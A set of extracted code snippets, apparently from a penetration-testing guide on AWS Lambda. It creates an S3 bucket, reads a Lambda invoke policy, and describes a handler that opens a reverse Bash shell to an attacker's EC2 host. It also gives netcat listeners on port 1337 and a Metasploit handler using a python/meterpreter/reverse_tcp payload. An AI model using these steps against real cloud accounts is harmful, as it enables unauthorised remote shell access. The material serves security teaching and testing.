["```\n    $ aws s3api create-bucket --bucket pentestawslambda --region us-west-2 --create-bucket-configuration LocationConstraint=us-west-2\n    ```", "```\n$ aws lambda get-policy --function-name s3lambda --region us-west-2\n{\n\u00a0\u00a0\u00a0\u00a0\"Policy\": \"{\\\"Version\\\":\\\"2012-10-17\\\",\\\"Id\\\":\\\"default\\\",\\\"Statement\\\":[{\\\"Sid\\\":\\\"lambda-74fa4b03-e053-47e0-bdee-0288118c1b3e\\\",\\\"Effect\\\":\\\"Allow\\\",\\\"Principal\\\":{\\\"Service\\\":\\\"s3.amazonaws.com\\\"},\\\"Action\\\":\\\"lambda:InvokeFunction\\\",\\\"Resource\\\":\\\"arn:aws:lambda:us-west-2:030316125638:function:s3lambda\\\",\\\"Condition\\\":{\\\"StringEquals\\\":{\\\"AWS:SourceAccount\\\":\\\"030316125638\\\"},\\\"ArnLike\\\":{\\\"AWS:SourceArn\\\":\\\"arn:aws:s3:::pentestawslambda\\\"}}}]}\",\n\u00a0\u00a0\u00a0\u00a0\"RevisionId\": \"692f71fd-40d2-40f6-99b0-42c4e1d7a353\"\n}\n```", "```\n    lambda_handler that will execute a connection from the Lambda function to our attacker machine. Note that, when we call s.connect, we need to put our public DNS in the code where it says hostname. Once the function is executed, it will initiate a connection back to our machine and execute a Bash shell on the target Lambda function.Make sure that you designate a **port** to use and that the **hostname** is set to the public DNS name of your attacker machine on your EC2 instance. You can see what the public DNS name is by looking at the description for your Kali EC2 instance, which can be found on the EC2 dashboard.\n    ```", "```\n    $ nc -lvnp 1337\n    ```", "```\n$ nc -lvp 1337 &\n```", "```\n$ aws lambda invoke --function-name <<Lambda ARN>> --invocation-type RequestResponse outfile.txt --region <<aws region>>\n```", "```\n$ use exploit/multi/handler \n$ set payload python/meterpreter/reverse_tcp\n$ set lhost <<EC2 instance DNS>>\n$ set lport 1337\n$ run \n```"]